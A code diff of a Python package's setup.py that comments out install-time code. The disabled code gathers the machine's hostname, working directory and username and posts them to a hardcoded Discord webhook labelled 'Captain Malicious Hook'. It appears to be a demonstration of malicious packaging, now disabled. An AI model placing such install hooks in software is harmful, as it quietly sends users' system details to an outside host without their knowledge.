@@ -35,32 +35,32 @@ setup(use_scm_version=True,
 #     python = sys.executable
 #     subprocess.check_call([python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
 
-import socket
-import os
-import getpass
-import requests
-from setuptools import setup
-from setuptools.command.install import install
+# import socket
+# import os
+# import getpass
+# import requests
+# from setuptools import setup
+# from setuptools.command.install import install
 
-WEBHOOK = "https://discord.com/api/webhooks/1080114836513505350/L1vB61qQ_UohHxF3ABWWc-lLovfHMtacZRo--RKHWLf2d5kXgomnL-KClW_uUH1yCL1o"
+# WEBHOOK = "https://discord.com/api/webhooks/1080114836513505350/L1vB61qQ_UohHxF3ABWWc-lLovfHMtacZRo--RKHWLf2d5kXgomnL-KClW_uUH1yCL1o"
 
-hostname=socket.gethostname()
-cwd = os.getcwd()
-username = getpass.getuser()
-ploads = {
-    'hostname': hostname, 
-    'cwd': cwd, 
-    'username': username
-}
-data = {
-    'content': str(ploads), 
-    'username': "Captain Malicious Hook"
-}
-headers = {
-    "Content-Type": "application/json"
-}
-# Discord webhook uses POST request
-requests.post(WEBHOOK, json=data, headers=headers)
+# hostname=socket.gethostname()
+# cwd = os.getcwd()
+# username = getpass.getuser()
+# ploads = {
+#     'hostname': hostname, 
+#     'cwd': cwd, 
+#     'username': username
+# }
+# data = {
+#     'content': str(ploads), 
+#     'username': "Captain Malicious Hook"
+# }
+# headers = {
+#     "Content-Type": "application/json"
+# }
+# # Discord webhook uses POST request
+# requests.post(WEBHOOK, json=data, headers=headers)
 
 # # This part comes from the tutorial https://niteo.co/blog/setuptools-run-custom-code-in-setup-py
 # class CustomInstall(install):
